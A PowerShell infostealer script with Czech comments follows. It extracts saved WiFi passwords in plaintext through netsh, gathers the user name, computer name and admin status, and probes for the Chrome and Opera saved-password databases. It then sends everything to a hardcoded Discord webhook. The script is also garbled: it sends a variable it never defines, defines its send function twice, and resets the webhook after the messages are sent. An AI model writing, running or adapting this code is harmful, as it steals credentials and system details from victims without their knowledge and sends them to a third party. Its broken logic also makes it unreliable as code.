# --- KONFIGURACE ---
$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_"

# Funkce pro odesílání zpráv na Discord
function Send-Discord {
    param([string]$message)
    $payload = @{ content = $message } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
}

# 1. Získání WiFi hesel
$wifi_data = ""
$profiles = netsh wlan show profiles | Select-String "\:(.*)$" | ForEach-Object { $_.Matches.Value.Trim() }
foreach ($profile in $profiles) {
    $pass = netsh wlan show profile name=$profile key=clear | Select-String "Key Content\s*:\s*(.*)" | ForEach-Object { $_.Matches.Value.Trim() }
    $wifi_data += "WiFi: $profile | Pass: $pass`n"
}

# 2. Informace o systému a uživateli
$sys_info = "User: " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name + "`n"
$sys_info += "Computer: " + $env:COMPUTERNAME + "`n"

# 3. Browser Data (Cesty k databázím)
# Moderní prohlížeče šifrují hesla pomocí DPAPI (AES-256-GCM). 
# Prostý PS skript je nemůže dekryptovat bez externího modulu, 
# ale můžeme zkontrolovat, zda existují a poslat info.
$chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$opera_path = "$env:LOCALAPPDATA\Opera\Opera Stable\Login Data"
$browser_info = ""
if (Test-Path $chrome_path) { $browser_info += "Chrome DB Found`n" }
if (Test-Path $opera_path) { $browser_info += "Opera DB Found`n" }

# 4. Kontrola Admin práv pro PC heslo
$admin_status = "Admin: No"
if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $admin_status = "Admin: YES (Full Access)"
}

# --- EXFILTRACE ---
# Vytvoření finální zprávy
$final_report = "--- SYSTEM REPORT ---`n" + 
                "User: $($env:USERNAME)`n" +
                "Admin: $admin_status`n" +
                "WiFi Passwords:`n$wifi_passwords`n" + 
                "Browser Data: Found`n" +
                "Sytem: $env:COMPUTERNAME"

# Pro zjednodušení a jistotu doručení posíláme sekce zvlášť
Send-Discord "Target: $env:COMPUTERNAME | User: $env:USERNAME"
Send-Discord "WiFi Credentials:`n$wifi_passwords"
Send-Discord "Admin Status: $admin_status"

# Funkce pro odeslání (oprava syntaxe)
function Send-Discord($text) {
    $payload = @{ content = $text } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
}

# Oprava volání - definujeme webhook znovu pro jistotu
$webhook_url = "https://discord.com/api/webhooks/1493022024094978132/HhVUBZqXDKft3RKLmalLpVK2dvjfMzUkDsFRdVemkQ8f8G8S3ivkqLgYqY6S8nVOCSw_" # Tady bude tvůj webhook
# (Zde vlož svůj webhook znovu, pokud ho skript nebere z proměnné)
